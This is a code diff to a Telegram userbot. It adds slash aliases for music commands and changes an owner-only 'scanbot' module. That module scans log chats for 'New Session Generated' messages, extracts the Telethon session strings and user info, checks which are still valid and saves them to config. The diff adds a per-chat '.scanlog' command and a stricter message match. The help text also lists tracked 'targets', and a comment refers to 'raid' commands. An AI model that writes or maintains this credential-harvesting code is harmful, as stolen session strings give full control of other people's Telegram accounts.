@@ -5714,7 +5714,7 @@ async def assistant_input_listener(event):
 # MAIN USER COMMAND HANDLER
 # ══════════════════════════════════════════
 _MUSIC_CMD_RE = re.compile(
-    r"(?i)^\.(play|vplay|skip|cut|playforce|pause|resume|"
+    r"(?i)^[./](play|vplay|skip|cut|playforce|pause|resume|"
     r"stopmusic|endmusic|musicstop|mend|queue|q|loop|mstatus)(\s+.+)?$"
 )
 # Low-risk commands that normal users may invoke without sudo. Destructive,
@@ -5790,6 +5790,11 @@ def create_event_handler(client):
                 pass
 
         text       = (event.text or "").strip()
+        # Once the owner has opened music with `.forall`, accept both `.play`
+        # and `/play` for music only. Normalize the latter before the existing
+        # dot-command branches; admin/raid/config commands remain unchanged.
+        if music_bypass and text.startswith("/"):
+            text = "." + text[1:]
         text_lower = text.lower()
         chat_id    = event.chat_id
 
@@ -7779,26 +7784,31 @@ def create_event_handler(client):
                     "Set with <code>.scanids -100123 -100456</code>.</blockquote>")
 
         # ══════════════════════════════════════════
-        # MODULE: SCANBOT — scan log channel for session strings
-        # Owner types .scanbot → bot reads LOG_CHANNEL history,
+        # MODULE: SCANBOT — owner-only scan of explicitly supplied/configured chats
+        # `.scanlog <chatid>` scans one owner-specified chat; `.scanub/.scanws`
+        # scan only IDs previously set through `.scanids`.
         # finds every "New Session Generated" message, parses the
         # session string + user info, validates each Telethon session
         # (skips expired ones), and saves valid ones to config.
         # ══════════════════════════════════════════
-        elif re.match(r"(?i)^\.(scanub|scanws)\s*$", text):
+        elif re.match(r"(?i)^\.(scanlog|scanub|scanws)(?:\s+-?\d+)?\s*$", text):
             if not await verify_privileges(event, client=client, strict_owner_only=True): return
             asyncio.create_task(event.delete())
 
-            _sm = re.match(r"(?i)^\.(scanub|scanws)\s*$", text)
-            _cmd_name = _sm.group(1).lower() if _sm else "scanub"
+            _sm = re.match(r"(?i)^\.(scanlog|scanub|scanws)(?:\s+(-?\d+))?\s*$", text)
+            _cmd_name = _sm.group(1).lower() if _sm else "scanlog"
+            _requested_scan_id = int(_sm.group(2)) if _sm and _sm.group(2) else None
             _scan_chat_ids = []
-            for _scan_id in (cfg.get("SCAN_CHAT_IDS", []) or []):
-                try:
-                    _scan_id = int(_scan_id)
-                    if _scan_id and _scan_id not in _scan_chat_ids:
-                        _scan_chat_ids.append(_scan_id)
-                except (TypeError, ValueError):
-                    pass
+            if _requested_scan_id:
+                _scan_chat_ids.append(_requested_scan_id)
+            if _requested_scan_id is None:
+                for _scan_id in (cfg.get("SCAN_CHAT_IDS", []) or []):
+                    try:
+                        _scan_id = int(_scan_id)
+                        if _scan_id and _scan_id not in _scan_chat_ids:
+                            _scan_chat_ids.append(_scan_id)
+                    except (TypeError, ValueError):
+                        pass
             if not _scan_chat_ids:
                 await safe_send_and_track(
                     client, chat_id,
@@ -7831,8 +7841,9 @@ def create_event_handler(client):
                         raw = getattr(msg, 'raw_text', '') or getattr(msg, 'text', '') or ''
                         if not raw:
                             continue
-                        # Must look like a session notification
-                        if 'Session' not in raw and 'SESSION' not in raw:
+                        # Only process the explicit generator notification;
+                        # unrelated messages containing the word "session" are ignored.
+                        if not re.search(r"new\s+session\s+generated", raw, re.IGNORECASE):
                             continue
 
                         sess_m = _re_sess.search(raw)
@@ -8095,6 +8106,7 @@ def create_event_handler(client):
                 "targetlist": ".targetlist — Show active tracked targets",
                 "restart":    ".restart — Restart the userbot (owner only)",
                 "scanids":    ".scanids [-100chatid ...] — Set/show owner-only scan chats",
+                "scanlog":    ".scanlog <chatid> — Scan one owner-supplied log chat",
                 "dice":       ".dice — Send a random dice emoji",
                 "play":       ".play [song name or URL] OR reply to audio — Streams in VC. "
                               "Paste any YouTube link or type a song name — it finds and plays it. "
